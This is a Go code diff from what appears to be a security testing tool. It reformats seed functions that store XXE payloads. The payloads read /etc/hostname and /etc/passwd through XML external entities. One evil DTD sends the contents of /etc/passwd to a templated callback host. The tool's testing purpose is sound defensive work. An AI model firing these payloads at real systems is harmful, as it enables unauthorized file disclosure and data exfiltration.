@@ -58,17 +58,23 @@ func seedWPAD(dbh *gorm.DB) *gorm.DB {
 }
 
 func seedXXEEtcHostname(dbh *gorm.DB) *gorm.DB {
-	h := newDefaultSimplePayload(`/sh$`, 1, "text/xml", []byte(`<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\n<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n<text font-size="16" x="0" y="16">&xxe;</text>\n</svg>`))
+	h := newDefaultSimplePayload(`/sh$`, 1, "text/xml", []byte(`<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="16" x="0" y="16">&xxe;</text>
+</svg>`))
 	return dbh.Create(h)
 }
 
 func seedXXERemoteRef(dbh *gorm.DB) *gorm.DB {
-	h := newDefaultSimplePayload(`/dt$`, 1, "text/xml", []byte(`<?xml version="1.0" encoding="ISO-8859-1"?>\n <!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .AlertPattern }}/xxe-test" >]><foo>&xxe;</foo>`))
+	h := newDefaultSimplePayload(`/dt$`, 1, "text/xml", []byte(`<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://{{ .Host }}/{{ .AlertPattern }}/xxe-test" >]><foo>&xxe;</foo>`))
 	return dbh.Create(h)
 }
 
 func seedEvilDTD(dbh *gorm.DB) *gorm.DB {
-	h := newDefaultSimplePayload(`/evil\.dtd$`, 1, "text/xml", []byte(`<!ENTITY % payl SYSTEM "file:///etc/passwd">\n<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`))
+	h := newDefaultSimplePayload(`/evil\.dtd$`, 1, "text/xml", []byte(`<!ENTITY % payl SYSTEM "file:///etc/passwd">
+<!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .AlertPattern }}/xxe?p=%payl;'>">`))
 	return dbh.Create(h)
 }
 func seedXSSJS(dbh *gorm.DB) *gorm.DB {
